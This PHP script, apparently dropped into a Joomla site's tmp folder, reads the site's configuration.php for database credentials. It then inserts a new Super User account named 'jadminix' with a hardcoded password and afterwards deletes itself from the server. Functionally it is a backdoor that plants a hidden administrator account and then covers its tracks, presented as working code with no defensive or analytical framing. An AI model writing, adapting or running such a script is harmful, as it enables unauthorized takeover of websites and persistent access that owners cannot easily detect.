<?php
define('_JEXEC', 1);

// Автоматически берет путь на один уровень выше папки tmp
define('JPATH_BASE', dirname(__DIR__)); 

if (!file_exists(JPATH_BASE . '/configuration.php')) {
    die('Файл configuration.php не найден по адресу: ' . JPATH_BASE);
}

require_once JPATH_BASE . '/configuration.php';
$config = new JConfig();
$dbHost = $config->host;
$dbPort = 3306;
if (strpos($dbHost, ':') !== false) {
    list($dbHost, $dbPort) = explode(':', $dbHost, 2);
}
try {
    $dsn = "mysql:host={$dbHost};port={$dbPort};dbname={$config->db};charset=utf8mb4";
    $pdo = new PDO($dsn, $config->user, $config->password, [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
} catch (PDOException $e) {
    die("Ошибка подключения к БД: " . $e->getMessage());
}

$prefix = $config->dbprefix;
$username = 'jadminix';
$email    = 'jadminix@gmail.com';
$fullName = 'jadminix';

$passwordPlain = 'solevisible';
$passwordHash = password_hash($passwordPlain, PASSWORD_BCRYPT);

try {
    $stmt = $pdo->prepare("SELECT id FROM `{$prefix}users` WHERE `username` = ?");
    $stmt->execute([$username]);
    if ($stmt->fetch()) {
        throw new Exception("Пользователь с логином '{$username}' уже существует!");
    }
    
    $currentDate  = date('Y-m-d H:i:s');
    $sqlUser = "INSERT INTO `{$prefix}users` 
                (`name`, `username`, `email`, `password`, `block`, `sendEmail`, `registerDate`, `lastvisitDate`, `activation`, `params`) 
                VALUES (?, ?, ?, ?, 0, 0, ?, '0000-00-00 00:00:00', '', '')";
    
    $stmt = $pdo->prepare($sqlUser);
    $stmt->execute([$fullName, $username, $email, $passwordHash, $currentDate]);
    
    $newUserId = $pdo->lastInsertId();
    $sqlGroup = "INSERT INTO `{$prefix}user_usergroup_map` (`user_id`, `group_id`) VALUES (?, 8)";
    $stmt = $pdo->prepare($sqlGroup);
    $stmt->execute([$newUserId]);

    echo "Create:OK ID: " . $newUserId . " (Пользователь успешно создан как Super User)";

} catch (Exception $e) {
    echo "Произошла ошибка: " . $e->getMessage();
}

if (@unlink(__FILE__)) {
    echo "<br>File deleted (Скрипт автоматически удален с сервера).";
}